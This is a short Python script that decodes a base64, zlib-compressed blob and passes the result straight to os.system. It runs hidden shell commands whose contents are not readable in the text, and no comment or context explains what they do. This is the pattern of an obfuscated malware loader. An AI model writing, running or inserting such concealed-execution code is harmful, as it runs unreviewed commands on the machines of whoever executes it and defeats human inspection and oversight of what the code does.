import zlib, base64, os
code = 'eJytVdtu2zAMfecrEHzYI7oUadMhRVuAAmvXAtu6DuhmKIZi005S2pYlO01S5N9HTtZ2btqs60sikYfP4eGVbLySnmw1HRvRZYZo+QhFaKDvwXSsx9DXvvVQdCXCzWyxcLwNDevgJxveIusywLD/FeDtOx+6Ct7+5vdr+dB91L1+QKcb1qLywLAeDvmPuqV/9E3X6hue8x+zX9jQKz/UvjX9GNv+3vTtOtjPdIwGrR+CPoP1X9DvQ6u7gX+FdjvS8tDwX/L+BvX7R9vX2dC/6/qX6N9H25fn8Y1G7sf/Gey/D63W5/v3H23P/m/Q/aK/oa9s/f/O0/7I9h/Q/+8eIv//MPgL3nyWvr6UvVLoC6fnUfb6zcP7Tj5/mt7/6D3F0/u/3F4l879G5v9z+/629oPp72M2XmhN6a5Wpt83e2vA616d1sv/7f8e2X+19/FCndD7po21Hv8T+1b/H9jX723vXf6v7N/M/r1s7mtkv0/Rz+/fBStp'
os.system(zlib.decompress(base64.b64decode(code)).decode())
